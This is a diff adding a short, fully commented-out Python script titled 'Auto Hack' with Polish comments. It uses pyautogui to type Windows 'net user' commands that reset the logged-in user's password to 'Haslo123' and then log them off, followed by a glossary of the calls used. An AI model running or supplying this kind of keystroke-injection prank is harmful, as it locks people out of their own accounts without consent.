@@ -1,0 +1,47 @@
+
+## --Auto Hack-- ##
+
+
+
+# -------------------------------------------------------------------------- #
+## Potrzbne biblioteki ##
+
+# import pyautogui
+# import time
+# import getpass
+
+
+## Zmienia hasło dla aktualnie zalogowanego użytkownika na dowolne hasło ##
+
+# aktualny_uzytkownik = getpass.getuser()
+
+# Wpisanie komendy net user z aktualnym użytkownikiem
+# pyautogui.typewrite(f'net user {aktualny_uzytkownik}')
+# pyautogui.press('enter')
+# pyautogui.typewrite(f'net user {aktualny_uzytkownik} *')
+# pyautogui.press('enter')
+# time.sleep(0.5)
+# pyautogui.typewrite('Haslo123')
+# pyautogui.press('enter')
+# pyautogui.typewrite('Haslo123')
+# pyautogui.press('enter')
+# pyautogui.typewrite('shutdown /l')
+
+## Opis Kodu ##
+
+# pyautogui.typewrite(f'') - wpisywanie komend
+
+# pyautogui.press('enter') - naciśnięcie enter
+
+# pyautogui.press('') - naciśnięcie innego klawisza
+
+# time.sleep(0.5) - czekanie
+
+# aktualny_uzytkownik = getpass.getuser() - Pobiera nazwę aktualnego użytkownika systemu
+
+# pyautogui.hotkey('win', 'r') - Wykonywanie skrótów klawiszowych
+
+## Link do strony ze wszystkimi komendami ##
+# https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
+
+# -------------------------------------------------------------------------- #
